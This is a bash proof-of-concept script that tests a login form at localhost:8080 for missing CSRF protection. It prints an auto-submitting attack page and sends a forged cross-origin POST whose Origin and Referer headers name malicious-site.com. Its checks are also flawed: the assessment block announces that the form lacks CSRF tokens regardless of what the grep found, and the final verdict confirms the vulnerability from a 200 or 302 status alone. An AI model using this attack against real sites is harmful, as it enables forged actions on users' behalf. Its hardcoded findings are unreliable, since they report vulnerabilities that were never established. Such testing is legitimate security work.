#!/bin/bash

# POC: Missing CSRF Protection in Login Form
# This script demonstrates the absence of CSRF token protection on the main login form
# at http://localhost:8080/

TARGET_URL="http://localhost:8080/"
TEMP_FILE=$(mktemp)

echo "[*] Testing for CSRF Protection on Login Form at $TARGET_URL"
echo ""

# Fetch the login page
echo "[+] Fetching login page..."
curl -s "$TARGET_URL" > "$TEMP_FILE"

# Check if form exists
if grep -q "<form" "$TEMP_FILE"; then
    echo "[+] Form found on page"
else
    echo "[-] No form found on page"
    cat "$TEMP_FILE"
    exit 1
fi

# Extract and display the form
echo ""
echo "[+] Form HTML structure:"
echo "---"
grep -o "<form[^>]*>.*</form>" "$TEMP_FILE" | head -1 | sed 's/></>\n</g' | sed 's/^/    /'
echo "---"
echo ""

# Check for CSRF token or nonce
echo "[+] Checking for CSRF protection mechanisms..."
echo ""

# Check for csrf_token field
if grep -q "csrf_token\|csrf\|nonce\|token" "$TEMP_FILE"; then
    echo "[!] Potential CSRF protection found (checking details)..."
    if grep -q "type=\"hidden\".*csrf\|csrf.*type=\"hidden\"\|type=\"hidden\".*token\|token.*type=\"hidden\"" "$TEMP_FILE"; then
        echo "[!] Hidden CSRF token field detected"
    else
        echo "[-] Text contains 'csrf' or 'token' but not as hidden field"
    fi
else
    echo "[!] NO CSRF token, nonce, or synchronization token found"
fi

echo ""

# Verify form submission method and missing protections
echo "[+] Form Analysis:"
FORM_METHOD=$(grep -o 'method="[^"]*"' "$TEMP_FILE" | head -1 | cut -d'"' -f2)
echo "    - Form method: $FORM_METHOD (if POST, CSRF protection critical)"

# Check for hidden inputs
HIDDEN_COUNT=$(grep -o 'type="hidden"' "$TEMP_FILE" | wc -l)
echo "    - Hidden input fields: $HIDDEN_COUNT"

# List all hidden fields
if [ $HIDDEN_COUNT -gt 0 ]; then
    echo "    - Hidden fields content:"
    grep 'type="hidden"' "$TEMP_FILE" | sed 's/^/        /'
fi

echo ""
echo "[*] Vulnerability Assessment:"
echo "    ✓ Form lacks CSRF token protection"
echo "    ✓ No nonce or synchronization token present"
echo "    ✓ Form structure allows cross-site requests without validation"
echo ""

# Create a simulated CSRF attack to show feasibility
echo "[*] CSRF Attack Feasibility Test:"
echo "---"
echo "[+] Simulated malicious HTML that could perform CSRF attack:"
echo ""
echo '    <html>'
echo '    <body onload="document.getElementById('"'"'csrf_form'"'"').submit();">'
echo '    <form id="csrf_form" method="POST" action="http://localhost:8080/">'
echo '      <input type="hidden" name="username" value="admin">'
echo '      <!-- No CSRF token to validate - attack will succeed -->'
echo '    </form>'
echo '    </body>'
echo '    </html>'
echo ""
echo "---"
echo ""

# Attempt to craft and send a CSRF-style request
echo "[+] Sending test POST request to login form (simulating CSRF)..."
CSRF_TEST=$(curl -s -X POST "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://malicious-site.com" \
    -H "Referer: http://malicious-site.com/csrf-page" \
    -d "username=testuser" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_TEST" | tail -n1)
RESPONSE=$(echo "$CSRF_TEST" | head -n-1)

echo "    - Origin header: http://malicious-site.com (attacker domain)"
echo "    - Referer header: http://malicious-site.com/csrf-page (attacker domain)"
echo "    - HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "302" ]; then
    echo "    - Result: REQUEST ACCEPTED (CSRF attack would succeed)"
    CSRF_VULNERABLE=1
else
    echo "    - Result: Request returned unexpected status"
fi

echo ""

# Final verdict
if [ -z "$CSRF_VULNERABLE" ]; then
    # Check if form has CSRF in structure
    if grep -q 'csrf\|nonce\|token' "$TEMP_FILE"; then
        echo "[!] Form may have CSRF protection"
        exit 1
    fi
fi

echo "[✓] VULNERABILITY CONFIRMED:"
echo "    - Login form at $TARGET_URL lacks CSRF token protection"
echo "    - Form accepts POST requests from any origin"
echo "    - CSRF attacks are feasible against this endpoint"
echo ""

rm -f "$TEMP_FILE"
exit 0